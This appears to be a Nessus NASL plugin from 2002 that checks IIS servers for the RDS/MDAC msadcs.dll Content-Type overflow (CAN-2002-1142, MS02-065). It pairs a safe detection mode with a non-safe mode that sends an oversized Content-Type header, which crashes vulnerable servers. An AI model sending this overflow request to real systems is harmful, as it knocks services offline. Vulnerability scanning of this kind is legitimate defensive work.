


if(description)
{
 script_id(11161);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CAN-2002-1142");



 name["english"] = "RDS / MDAC Vulnerability Content-Type overflow";

  
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote DLL /msadc/msadcs.dll is accessible by anyone. 
Several flaws have been found in it in the past, we recommand
you restrict access to MSADC only to trusted hosts.

Solution: 
  - Launch the Internet Services Manager
  - Select your web server
  - Right-click on MSADC and select 'Properties'
  - Select the tab 'Directory Security'
  - Click on the 'IP address and domain name restrictions'
    option
  - Make sure that by default, all computers are DENIED access
    to this resource
  - List the computers that should be allowed to use it
  
See also: MS advisory MS02-065
Risk factor: High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of msadcs.dll";


 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";

 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;

if(safe_checks())
{
req = string("POST /msadc/msadcs.dll HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"Content-Type: text/plain\r\n",
"Content-Length: 1\r\n\r\nX");

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 headers = http_recv_headers(soc);
 body = http_recv_body(socket:soc, headers:headers);
 http_close_socket(soc);
 z = string(headers, body);
 if(!z)exit(0);
 if("Content-Type: application/x-varg" >< z){
report = "
The remote DLL /msadc/msadcs.dll is accessible by anyone. 
Several flaws have been found in it in the past, we recommand
you restrict access to MSADC only to trusted hosts.

*** Nessus did not test for any security vulnerability
*** but solely relied on the presence of this resource
*** to issue this warning

Solution: 
  - Launch the Internet Services Manager
  - Select your web server
  - Right-click on MSADC and select 'Properties'
  - Select the tab 'Directory Security'
  - Click on the 'IP address and domain name restrictions'
    option
  - Make sure that by default, all computers are DENIED access
    to this resource
  - List the computers that should be allowed to use it
  
See also: MS advisory MS02-065
Risk factor: High";
 
 security_hole(port:port, data:report);
  }
 }
}
else
{
 #
 # Okay, it turns out that this method crashes HTTP/1.0
 # support in IIS (not HTTP/1.1)
 # 
 req = string("GET /nessus.asp HTTP/1.0\r\n\r\n");
 soc = http_open_socket(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 close(soc);
 if(!r)exit(0);
 
 
 
 q = raw_string(0x22);
 body = string("Content-Type: application/", crap(32768), ";bob=", q, "bob", q, "\r\n",
 	       "Content-Length: 0\r\n");
	       
 len = strlen(body);	    
	       
 req = string("POST /msadc/msadcs.dll/AdvancedDataFactory.Query HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"Content-Length: ", len, "\r\n\r\n", body);

  soc = http_open_socket(port);
  if(!soc)exit(0);
  send(socket:soc, data:req);
  r = http_recv_headers(soc);
  
  close(soc);
  
 sleep(1);
 req = string("GET /nessus.asp HTTP/1.0\r\n\r\n");
 soc = http_open_socket(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 close(soc);
 if(!r)security_hole(port);
}
